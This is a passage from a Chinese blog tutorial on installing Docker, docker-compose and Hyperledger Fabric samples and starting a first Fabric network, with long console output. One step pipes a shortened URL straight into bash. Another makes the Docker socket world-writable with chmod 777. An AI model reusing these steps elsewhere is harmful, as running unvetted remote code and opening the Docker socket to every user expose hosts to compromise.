class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~   </span><br><span class="line">mkdir  -p  go/src/github.com/hyperledger/fabric <span class="comment">#fabric安装目录</span></span><br><span class="line">sudo chmod -R 777 go</span><br></pre></td></tr></table></figure><h4 id="2、docker安装（使用docker仓库"><a href="#2、docker安装（使用docker仓库" class="headerlink" title="2、docker安装（使用docker仓库)"></a>2、docker安装（使用docker仓库)</h4><p>卸载旧版本docker，未安装docker可忽略此步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure><p>更新apt-get</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>下载安装工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>添加官方密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>将加入apt仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="variable">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">   stable"</span></span><br></pre></td></tr></table></figure><p>下载docker-ce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure><p>完成上面操作之后输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p>出现下面内容：</p><pre><code>Client: Version:           18.09.3 API version:       1.39 Go version:        go1.10.8 Git commit:        774a1f4 Built:             Thu Feb 28 06:40:58 2019 OS/Arch:           linux/amd64 Experimental:      falseGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.39/version: dial unix /var/run/docker.sock: connect: permission denied</code></pre><p>此时已经安装好Docker了，但是还需要一些小操作。因为普通用户没有权限 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker    <span class="comment">#创建docker组</span></span><br><span class="line">sudo usermod -aG docker <span class="comment">#XXX(XXX是当前用户名)</span></span><br></pre></td></tr></table></figure><p>下面添加阿里云的Docker镜像： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker     <span class="comment">#创建docker目录</span></span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>将以下内容写入daemon.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://obou6wyb.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload </span><br><span class="line">sudo systemctl restart docker </span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><p>如果还有权限不足提示，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod -R 777 /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>正确的结果：</p><pre><code>Client: Version:           18.09.3 API version:       1.39 Go version:        go1.10.8 Git commit:        774a1f4 Built:             Thu Feb 28 06:40:58 2019 OS/Arch:           linux/amd64 Experimental:      falseServer: Docker Engine - Community Engine:  Version:          18.09.3  API version:      1.39 (minimum version 1.12)  Go version:       go1.10.8  Git commit:       774a1f4  Built:            Thu Feb 28 05:59:55 2019  OS/Arch:          linux/amd64  Experimental:     false</code></pre><p>到此docker安装完毕</p><h4 id="3、docker-compose安装"><a href="#3、docker-compose安装" class="headerlink" title="3、docker-compose安装"></a>3、docker-compose安装</h4><p>安装pip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip </span><br><span class="line">sudo pip install docker-compose</span><br></pre></td></tr></table></figure><p>查看docker-compose版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><p>出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose version 1.23.2, build 1110ad0</span><br></pre></td></tr></table></figure><p>安装成功！</p><h4 id="4、fabric-sample安装"><a href="#4、fabric-sample安装" class="headerlink" title="4、fabric-sample安装"></a>4、fabric-sample安装</h4><p>git下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> go/src/github.com/hyperledger/fabric/</span><br><span class="line">sudo git <span class="built_in">clone</span> https://github.com/hyperledger/fabric-samples.git</span><br><span class="line">sudo chmod -R 777 fabric-sample   <span class="comment">#修改fabric-sample权限</span></span><br></pre></td></tr></table></figure><h4 id="5、下载docker镜像"><a href="#5、下载docker镜像" class="headerlink" title="5、下载docker镜像"></a>5、下载docker镜像</h4><p>进入fabric目录，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://bit.ly/2ysbOFE | bash -s -- 1.4.0</span><br></pre></td></tr></table></figure><p>下载等待时间稍久，完成后输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>出现以下镜像，则说明下载成功！</p><p><img src="/2019/03/24/hyperledger/2.JPG" alt=""></p><h3 id="三、构建第一个fabric网络"><a href="#三、构建第一个fabric网络" class="headerlink" title="三、构建第一个fabric网络"></a>三、构建第一个fabric网络</h3><h4 id="1、进入fabric-sample-first-network中"><a href="#1、进入fabric-sample-first-network中" class="headerlink" title="1、进入fabric-sample/first-network中"></a>1、进入fabric-sample/first-network中</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fabric-samples/first-network/</span><br></pre></td></tr></table></figure><h4 id="2、生成各种配置文件及工具"><a href="#2、生成各种配置文件及工具" class="headerlink" title="2、生成各种配置文件及工具"></a>2、生成各种配置文件及工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m generate -c mytest1   <span class="comment">#mytest为channel名称</span></span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">##########################################################</span><br><span class="line">##### Generate certificates using cryptogen tool #########</span><br><span class="line">##########################################################</span><br><span class="line">+ cryptogen generate --config=./crypto-config.yaml</span><br><span class="line">org1.example.com</span><br><span class="line">org2.example.com</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">/home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/../bin/configtxgen</span><br><span class="line">##########################################################</span><br><span class="line">#########  Generating Orderer Genesis block ##############</span><br><span class="line">##########################################################</span><br><span class="line">CONSENSUS_TYPE=solo</span><br><span class="line">+ &apos;[&apos; solo == solo &apos;]&apos;</span><br><span class="line">+ configtxgen -profile TwoOrgsOrdererGenesis -channelID byfn-sys-channel -outputBlock ./channel-artifacts/genesis.block</span><br><span class="line">2019-03-13 17:02:39.913 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.017 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 002 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.018 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 003 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.101 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 004 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.103 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 005 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.108 CST [common.tools.configtxgen] doOutputBlock -&gt; INFO 006 Generating genesis block</span><br><span class="line">2019-03-13 17:02:40.109 CST [common.tools.configtxgen] doOutputBlock -&gt; INFO 007 Writing genesis block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">### Generating channel configuration transaction &apos;channel.tx&apos; ###</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID mytest1</span><br><span class="line">2019-03-13 17:02:40.206 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.295 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.371 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.371 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.372 CST [common.tools.configtxgen] doOutputChannelCreateTx -&gt; INFO 005 Generating new channel configtx</span><br><span class="line">2019-03-13 17:02:40.391 CST [common.tools.configtxgen] doOutputChannelCreateTx -&gt; INFO 006 Writing new channel tx</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">#######    Generating anchor peer update for Org1MSP   ##########</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org1MSPanchors.tx -channelID mytest1 -asOrg Org1MSP</span><br><span class="line">2019-03-13 17:02:40.468 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.539 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 005 Generating anchor peer update</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 006 Writing anchor peer update</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">#######    Generating anchor peer update for Org2MSP   ##########</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org2MSPanchors.tx -channelID mytest1 -asOrg Org2MSP</span><br><span class="line">2019-03-13 17:02:40.696 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.773 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 005 Generating anchor peer update</span><br><span class="line">2019-03-13 17:02:40.847 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 006 Writing anchor peer update</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br></pre></td></tr></table></figure><h4 id="3、启动网络"><a href="#3、启动网络" class="headerlink" title="3、启动网络"></a>3、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m up -c mytest1</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">Creating network &quot;net_byfn&quot; with the default driver</span><br><span class="line">Creating volume &quot;net_peer0.org2.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer1.org2.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer1.org1.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer0.org1.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_orderer.example.com&quot; with default driver</span><br><span class="line">Creating peer1.org2.example.com ... done</span><br><span class="line">Creating peer0.org2.example.com ... done</span><br><span class="line">Creating peer1.org1.example.com ... done</span><br><span class="line">Creating peer0.org1.example.com ... done</span><br><span class="line">Creating orderer.example.com    ... done</span><br><span class="line">Creating cli                    ... done</span><br><span class="line"></span><br><span class="line"> ____    _____      _      ____    _____ </span><br><span class="line">/ ___|  |_   _|    / \    |  _ \  |_   _|</span><br><span class="line">\___ \    | |     / _ \   | |_) |   | |  </span><br><span class="line"> ___) |   | |    / ___ \  |  _ &lt;    | |  </span><br><span class="line">|____/    |_|   /_/   \_\ |_| \_\   |_|  </span><br><span class="line"></span><br><span class="line">Build your first network (BYFN) end-to-end test</span><br><span class="line"></span><br><span class="line">+ peer channel create -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/channel.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">Channel name : mytest1</span><br><span class="line">Creating channel...</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:35.602 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:35.801 UTC [cli.common] readBlock -&gt; INFO 002 Received block: 0</span><br><span class="line">===================== Channel &apos;mytest1&apos; created ===================== </span><br><span class="line"></span><br><span class="line">Having all peers join the channel...</span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:36.041 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:36.177 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer0.org1 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:39.396 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:39.473 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer1.org1 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:42.656 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:42.729 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer0.org2 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:45.890 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:45.990 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer1.org2 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Updating anchor peers for org1...</span><br><span class="line">+ peer channel update -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/Org1MSPanchors.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:49.159 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:49.208 UTC [channelCmd] update -&gt; INFO 002 Successfully submitted channel update</span><br><span class="line">===================== Anchor peers updated for org &apos;Org1MSP&apos; on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Updating anchor peers for org2...</span><br><span class="line">+ peer channel update -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/Org2MSPanchors.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:52.409 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:52.441 UTC [channelCmd] update -&gt; INFO 002 Successfully submitted channel update</span><br><span class="line">===================== Anchor peers updated for org &apos;Org2MSP&apos; on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Installing chaincode on peer0.org1...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:55.668 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:55.668 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:03:58.029 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer0.org1 ===================== </span><br><span class="line"></span><br><span class="line">Install chaincode on peer0.org2...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:58.241 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:58.241 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:03:58.597 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer0.org2 ===================== </span><br><span class="line"></span><br><span class="line">Instantiating chaincode on peer0.org2...</span><br><span class="line">+ peer chaincode instantiate -o orderer.example.com:7050 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem -C mytest1 -n mycc -l golang -v 1.0 -c &apos;&#123;&quot;Args&quot;:[&quot;init&quot;,&quot;a&quot;,&quot;100&quot;,&quot;b&quot;,&quot;200&quot;]&#125;&apos; -P &apos;AND (&apos;\&apos;&apos;Org1MSP.peer&apos;\&apos;&apos;,&apos;\&apos;&apos;Org2MSP.peer&apos;\&apos;&apos;)&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:58.812 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:58.812 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">===================== Chaincode is instantiated on peer0.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Querying chaincode on peer0.org1...</span><br><span class="line">===================== Querying on peer0.org1 on channel &apos;mytest1&apos;... ===================== </span><br><span class="line">Attempting to Query peer0.org1 ...3 secs</span><br><span class="line">+ peer chaincode query -C mytest1 -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">100</span><br><span class="line">===================== Query successful on peer0.org1 on channel &apos;mytest1&apos; ===================== </span><br><span class="line">Sending invoke transaction on peer0.org1 peer0.org2...</span><br><span class="line">+ peer chaincode invoke -o orderer.example.com:7050 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem -C mytest1 -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt -c &apos;&#123;&quot;Args&quot;:[&quot;invoke&quot;,&quot;a&quot;,&quot;b&quot;,&quot;10&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:06:36.914 UTC [chaincodeCmd] chaincodeInvokeOrQuery -&gt; INFO 001 Chaincode invoke successful. result: status:200 </span><br><span class="line">===================== Invoke transaction successful on peer0.org1 peer0.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Installing chaincode on peer1.org2...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:06:37.117 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:06:37.117 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:06:37.506 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer1.org2 ===================== </span><br><span class="line"></span><br><span class="line">Querying chaincode on peer1.org2...</span><br><span class="line">===================== Querying on peer1.org2 on channel &apos;mytest1&apos;... ===================== </span><br><span class="line">Attempting to Query peer1.org2 ...3 secs</span><br><span class="line">+ peer chaincode query -C mytest1 -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos;</span><br><span 